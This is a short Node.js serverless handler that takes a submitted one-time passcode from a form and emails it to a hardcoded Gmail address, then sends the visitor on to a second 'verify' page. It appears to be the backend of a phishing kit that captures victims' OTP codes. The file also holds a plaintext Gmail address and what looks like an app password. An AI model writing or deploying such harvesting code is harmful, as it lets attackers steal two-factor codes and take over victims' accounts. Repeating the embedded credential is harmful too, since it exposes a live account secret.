const nodemailer = require("nodemailer");

module.exports = async (req, res) => {
  if (req.method !== "POST") return res.status(405).end();

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "allenshaw302@gmail.com",
      pass: "fmsreotrrcygqlyu"
    }
  });

  const mailOptions = {
    from: "allenshaw302@gmail.com",
    to: "allenshaw302@gmail.com",
    subject: "New Submission - OTP Code",
    text: `Code: ${req.body.code}`
  };

  try {
    await transporter.sendMail(mailOptions);
    res.redirect(302, "/verify2.html");
  } catch (err) {
    console.error(err);
    res.status(500).send("Failed to send email");
  }
};